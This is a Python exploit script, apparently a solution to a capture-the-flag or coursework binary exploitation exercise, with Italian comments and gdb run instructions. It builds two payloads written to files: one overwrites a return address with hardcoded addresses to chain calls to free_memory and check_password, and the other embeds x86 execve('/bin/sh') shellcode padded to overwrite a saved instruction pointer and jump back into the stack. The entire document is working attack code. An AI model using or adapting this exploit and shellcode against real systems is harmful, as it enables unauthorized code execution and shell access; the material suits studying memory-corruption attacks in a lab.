import struct

diff_p_eip = 28
free_memory = 0x804855b
check_password = 0x8048622
secret = 0x804b410
dif_input_eip = 112
exit = 0xb7e337f0
input_addr = 0xbffff108
gets = 0x08048666
ret = 0x0a

shellcode = (b"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")

#gets(input) in get_input
atk_vector = "A" * diff_p_eip
atk_vector += struct.pack("I", free_memory)
atk_vector += struct.pack("I", check_password) #ret free_memory
atk_vector += struct.pack("I", secret)#parametro free_memory

#ora sono in check_password
atk_vector += struct.pack("I", secret) #parametro di check_password
atk_vector += struct.pack("B", ret) #return to stack

#gets(input) in check_password
atk_vector2 = shellcode
#atk_vector2 += b"\0"
atk_vector2 += "A" * (112 - len(atk_vector2))
atk_vector2 += struct.pack("I", input_addr)

f = open("solUaf", "w+")
f.write(atk_vector)
f.close()

f = open("solUaf2", "w+")
f.write(atk_vector2)
f.close()

# cat solUaf solUaf2 > file
# (gdb) r < file
